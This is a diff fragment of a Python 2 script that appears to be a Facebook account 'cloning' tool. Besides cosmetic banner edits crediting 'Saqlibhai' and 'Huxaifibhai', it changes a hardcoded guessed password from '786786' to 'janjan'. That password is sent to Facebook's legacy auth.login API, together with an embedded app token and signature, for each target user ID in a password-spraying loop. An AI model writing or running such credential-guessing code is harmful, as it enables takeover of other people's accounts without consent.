@@ -297,11 +297,13 @@ def pilih_super():
 	jalan('\033[1;92mPlease Wait\033[1;93m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
+		
+		
 		print("\r\033[1;91mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;94m«-----\x1b[1;93m♡To Stop Process Press CTRL+Z♡\033[1;94m----»"
-	print "\033[1;95m♡─────────•◈•─────────♡\033[1;96Saqlibhai\033[1;95m♡─────────•◈•─────────♡"
+	print "\033[1;95m♡─────────•◈•─────────♡\033[1;96  Saqlibhai\033[1;95m♡─────────•◈•─────────♡"
 	jalan(' \033[1;93m ........Cloning Start plzzz Wait by Saqli.......... ')
-	print "\033[1;95m♡─────────•◈•─────────♡\033[1;96Huxaifibhai\033[1;95m♡─────────•◈•─────────♡"
+	print "\033[1;95m♡─────────•◈•─────────♡\033[1;96  Huxaifibhai\033[1;95m♡─────────•◈•─────────♡"
 	
 			
 	def main(arg):
@@ -314,7 +316,7 @@ def pilih_super():
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
-			pass1 = ('786786')
+			pass1 = ('janjan')
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
